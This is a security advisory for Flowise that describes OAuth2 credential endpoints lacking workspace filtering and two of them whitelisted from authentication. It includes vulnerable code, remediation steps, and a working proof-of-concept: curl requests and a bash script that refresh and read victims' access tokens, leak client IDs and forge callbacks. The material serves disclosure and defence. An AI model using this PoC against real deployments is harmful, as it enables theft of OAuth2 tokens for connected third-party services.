# [H] Flowise: Cross-Workspace OAuth2 Credential Metadata Leak

## Summary
Severity: High
Advisory: GHSA-wch5-xp77-fxg4
CVE: CVE-2026-70474
CWE: CWE-863
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-wch5-xp77-fxg4
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.3

## Details
## Summary

Three OAuth2 credential endpoints look up credentials by `id` alone with no `workspaceId` filter. Two of these endpoints (`callback`, `refresh`) are whitelisted from all authentication. This allows:

1. **Cross-workspace credential access** — Any authenticated user can initiate OAuth2 flows against credentials belonging to other workspaces.
2. **Unauthenticated token injection** — An unauthenticated attacker can forge OAuth2 callbacks to overwrite tokens in any credential.
3. **Unauthenticated token refresh** — An unauthenticated attacker can refresh tokens for any credential.

---

## Root Cause

### Vulnerable code: no workspace scoping

All three OAuth2 handlers query the `Credential` table by `id` only:

**`packages/server/src/routes/oauth2/index.ts:80-82`** (authorize)
```typescript
const credential = await credentialRepository.findOneBy({
    id: credentialId
    // Missing: workspaceId filter
})
```

**`packages/server/src/routes/oauth2/index.ts:183-185`** (callback)
```typescript
const credential = await credentialRepository.findOneBy({
    id: state as string
    // Missing: workspaceId filter
})
```

**`packages/server/src/routes/oauth2/index.ts:314-316`** (refresh)
```typescript
const credential = await credentialRepository.findOneBy({
    id: credentialId
    // Missing: workspaceId filter
})
```

### Correct pattern (same codebase)

The standard credential service correctly enforces workspace isolation:

**`packages/server/src/services/credentials/index.ts:130-132`**
```typescript
const credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({
    id: credentialId,
    workspaceId: workspaceId  // <-- Workspace scoping present
})
```

### Authentication bypass via whitelist

**`packages/server/src/utils/constants.ts:40-41`**
```typescript
export const WHITELIST_URLS = [
    // ...
    '/api/v1/oauth2-credential/callback',   // line 40
    '/api/v1/oauth2-credential/refresh',     // line 41
    // ...
]
```

**`packages/server/src/index.ts:223-225`** — prefix-matched whitelist skips all auth:
```typescript
const isWhitelisted = whitelistURLs.some((url) => req.path.startsWith(url))
if (isWhitelisted) {
    next()  // No JWT verification, no API key check
}
```

---

## Attack Scenarios

### Scenario A: Cross-Workspace Credential Metadata Leak

An authenticated user in Workspace A initiates an OAuth2 authorize flow for a credential belonging to Workspace B. The server returns an authorization URL containing the victim credential's `client_id`, `scope`, and `redirect_uri`.

```
POST /api/v1/oauth2-credential/authorize/<VICTIM_CREDENTIAL_UUID>
Cookie: connect.sid=<ATTACKER_SESSION>
```

**Response:**
```json
{
  "success": true,
  "credentialId": "<VICTIM_CREDENTIAL_UUID>",
  "authorizationUrl": "https://provider.com/oauth2/authorize?client_id=LEAKED_CLIENT_ID&scope=LEAKED_SCOPE&...",
  "redirectUri": "https://flowise-instance/api/v1/oauth2-credential/callback"
}
```

### Scenario B: Unauthenticated Token Injection via Forged Callback

The callback endpoint requires no authentication and uses the `state` parameter as the credential lookup key. An attacker who controls an OAuth2 provider (or MitMs the flow) can inject arbitrary tokens into any credential.

```
GET /api/v1/oauth2-credential/callback?code=ATTACKER_AUTH_CODE&state=<VICTIM_CREDENTIAL_UUID>
(No authentication required)
```

The server exchanges the code at the credential's `accessTokenUrl`, and whatever tokens the provider returns are encrypted and stored into the victim's credential record (line 271):

```typescript
await credentialRepository.update(credential.id, {
    encryptedData,      // Contains attacker-controlled token data
    updatedDate: new Date()
})
```

### Scenario C: Unauthenticated Token Refresh

An attacker can refresh any credential's OAuth2 tokens without authentication. The server reads the stored `refresh_token`, exchanges it at the `accessTokenUrl`, and returns fresh token metadata.

```
POST /api/v1/oauth2-credential/refresh/<VICTIM_CREDENTIAL_UUID>
(No authentication required)
```

**Response:**
```json
{
  "success": true,
  "credentialId": "<VICTIM_CREDENTIAL_UUID>",
  "tokenInfo": {
    "access_token": "new-access-token-value",
    "token_type": "Bearer",
    "expires_in": 3600,
    "has_new_refresh_token": false,
    "expires_at": "2026-04-13T12:00:00.000Z"
  }
}
```

The fresh `access_token` is returned directly in the response body (line 393-401), giving the attacker a valid OAuth2 token for whatever service the victim credential is connected to.

---

## Proof of Concept

### Prerequisites

- A running Flowise instance with at least two workspaces (Workspace A and Workspace B)
- An OAuth2 credential configured in Workspace B (the victim)
- The credential UUID of the victim credential (obtainable by any member of Workspace B, or via IDOR — see Finding 4)

### Step 1 — Confirm unauthenticated refresh endpoint is reachable

```bash
# No cookies, no Bearer token — completely unauthenticated
FLOWISE_URL="https://TARGET_INSTANCE"
VICTIM_CRED_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

curl -s -X POST "${FLOWISE_URL}/api/v1/oauth2-credential/refresh/${VICTIM_CRED_ID}" \
  -H "Content-Type: application/json"
```

**Expected result if credential exists and has a refresh token:**
```json
{
  "success": true,
  "message": "OAuth2 token refreshed successfully",
  "credentialId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "tokenInfo": {
    "access_token": "<VALID_ACCESS_TOKEN>",
    "token_type": "Bearer",
    "expires_in": 3600,
    "has_new_refresh_token": false,
    "expires_at": "2026-04-13T..."
  }
}
```

**Expected result if credential not found:**
```json
{
  "success": false,
  "message": "Credential not found"
}
```

### Step 2 — Cross-workspace authorize (requires any valid session)

```bash
# Attacker is authenticated in Workspace A
# They target a credential UUID from Workspace B
ATTACKER_COOKIE="connect.sid=s%3A..."

curl -s -X POST "${FLOWISE_URL}/api/v1/oauth2-credential/authorize/${VICTIM_CRED_ID}" \
  -H "Cookie: ${ATTACKER_COOKIE}" \
  -H "Content-Type: application/json"
```

**Expected result — victim credential's OAuth2 config is leaked:**
```json
{
  "success": true,
  "credentialId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "authorizationUrl": "https://login.microsoftonline.com/.../authorize?client_id=VICTIM_CLIENT_ID&scope=VICTIM_SCOPES&...",
  "redirectUri": "https://TARGET_INSTANCE/api/v1/oauth2-credential/callback"
}
```

### Step 3 — Forge callback to inject attacker-controlled tokens

```bash
# Attacker sets up a rogue OAuth2 provider that returns crafted tokens,
# OR intercepts a legitimate flow.
# The state parameter is the victim credential UUID.

curl -s "${FLOWISE_URL}/api/v1/oauth2-credential/callback?code=ATTACKER_CODE&state=${VICTIM_CRED_ID}"
```

The server POSTs the `code` to the credential's `accessTokenUrl`. If the attacker controls the OAuth2 provider (or has a valid code), the returned tokens are written into the victim's credential.

### Full automated PoC script

```bash
#!/usr/bin/env bash
set -euo pipefail

# ---- Configuration ----
FLOWISE_URL="${1:?Usage: $0 <flowise_url> <victim_credential_uuid> [attacker_cookie]}"
VICTIM_CRED_ID="${2:?Usage: $0 <flowise_url> <victim_credential_uuid> [attacker_cookie]}"
ATTACKER_COOKIE="${3:-}"

echo "=== OAuth2 Cross-Workspace Credential Hijacking PoC ==="
echo "Target:     ${FLOWISE_URL}"
echo "Credential: ${VICTIM_CRED_ID}"
echo ""

# --- Attack Vector 1: Unauthenticated token refresh ---
echo "[1] Attempting unauthenticated token refresh..."
REFRESH_RESP=$(curl -s -w "\n%{http_code}" -X POST \
  "${FLOWISE_URL}/api/v1/oauth2-credential/refresh/${VICTIM_CRED_ID}" \
  -H "Content-Type: application/json")

HTTP_CODE=$(echo "${REFRESH_RESP}" | tail -1)
BODY=$(echo "${REFRESH_RESP}" | head -n -1)

if [ "${HTTP_CODE}" = "200" ]; then
  echo "[!] VULNERABLE — Unauthenticated token refresh succeeded"
  echo "    Response: ${BODY}" | head -c 500
  echo ""
elif echo "${BODY}" | grep -q "Credential not found"; then
  echo "[*] Credential not found (UUID may be invalid)"
elif echo "${BODY}" | grep -q "Missing required"; then
  echo "[*] Credential exists but has no refresh_token (no prior OAuth2 flow)"
  echo "    This still confirms the endpoint is reachable without auth"
else
  echo "[*] HTTP ${HTTP_CODE}: ${BODY}" | head -c 300
fi
echo ""

# --- Attack Vector 2: Cross-workspace authorize (needs session) ---
if [ -n "${ATTACKER_COOKIE}" ]; then
  echo "[2] Attempting cross-workspace authorize..."
  AUTH_RESP=$(curl -s -w "\n%{http_code}" -X POST \
    "${FLOWISE_URL}/api/v1/oauth2-credential/authorize/${VICTIM_CRED_ID}" \
    -H "Cookie: ${ATTACKER_COOKIE}" \
    -H "Content-Type: application/json")

  HTTP_CODE=$(echo "${AUTH_RESP}" | tail -1)
  BODY=$(echo "${AUTH_RESP}" | head -n -1)

  if [ "${HTTP_CODE}" = "200" ]; then
    echo "[!] VULNERABLE — Cross-workspace credential access confirmed"
    echo "    Leaked authorization URL:"
    echo "${BODY}" | python3 -m json.tool 2>/dev/null || echo "    ${BODY}" | head -c 500
  else
    echo "[*] HTTP ${HTTP_CODE}: ${BODY}" | head -c 300
  fi
else
  echo "[2] Skipped cross-workspace authorize (no attacker cookie provided)"
fi
echo ""

# --- Attack Vector 3: Confirm callback is unauthenticated ---
echo "[3] Confirming callback endpoint is unauthenticated..."
CALLBACK_RESP=$(curl -s -w "\n%{http_code}" \
  "${FLOWISE_URL}/api/v1/oauth2-credential/callback?code=poc_test_code&state=${VICTIM_CRED_ID}")

HTTP_CODE=$(echo "${CALLBACK_RESP}" | tail -1)

# Any response other than 401/403 confirms the endpoint is reachable without auth.
# A 400 with "token_exchange_failed" means the endpoint processed the request
# (tried to exchange the code) — it just failed at the external provider.
if [ "${HTTP_CODE}" = "401" ] || [ "${HTTP_CODE}" = "403" ]; then
  echo "[*] Callback endpoint returned ${HTTP_CODE} — auth is enforced (NOT vulnerable)"
else
  echo "[!] VULNERABLE — Callback endpoint reachable without auth (HTTP ${HTTP_CODE})"
  echo "    The server attempted to process the OAuth2 callback."
  echo "    With a valid authorization code, tokens would be written to the credential."
fi

echo ""
echo "=== PoC Complete ==="
```

---

## Impact

| Vector | Auth Required | Impact |
|--------|--------------|--------|
| Credential metadata leak via `/authorize` | Low (any session) | Exposes `client_id`, `scope`, `redirect_uri` from any workspace's credential |
| Token injection via `/callback` | None | Overwrite any credential's stored OAuth2 tokens with attacker-controlled values |
| Token theft via `/refresh` | None | Obtain a fresh `access_token` for any credential's connected service (Microsoft 365, Google, etc.) |

**Chained impact:** An attacker who obtains a single credential UUID (via IDOR, log exposure, or brute-force of UUIDs) can silently refresh and steal OAuth2 access tokens for external services like Microsoft Graph, Google Workspace, or any custom OAuth2 provider — without any authentication to the Flowise instance.

---

## Affected Components

| File | Lines | Issue |
|------|-------|-------|
| `packages/server/src/routes/oauth2/index.ts` | 80-82 | `findOneBy({ id })` — no `workspaceId` |
| `packages/server/src/routes/oauth2/index.ts` | 183-185 | `findOneBy({ id: state })` — no `workspaceId` |
| `packages/server/src/routes/oauth2/index.ts` | 314-316 | `findOneBy({ id })` — no `workspaceId` |
| `packages/server/src/utils/constants.ts` | 40 | `/callback` whitelisted from auth |
| `packages/server/src/utils/constants.ts` | 41 | `/refresh` whitelisted from auth |

---

## Remediation

1. **Add `workspaceId` to all credential lookups** in the OAuth2 routes, matching the pattern already used in `services/credentials/index.ts:130-132`:

```typescript
// Before (vulnerable)
const credential = await credentialRepository.findOneBy({ id: credentialId })

// After (fixed)
const credential = await credentialRepository.findOneBy({
    id: credentialId,
    workspaceId: req.user?.activeWorkspaceId
})
```

2. **Remove `/callback` and `/refresh` from `WHITELIST_URLS`** or implement a signed, time-limited state token that authenticates the callback without a session.

3. **Replace the `state` parameter** with a cryptographically random nonce bound to the user's session (see also Finding 8).

4. **Do not return `access_token` in the `/refresh` response body.** The token should only be stored server-side in the encrypted credential data, never sent to the caller.

---

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wch5-xp77-fxg4
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
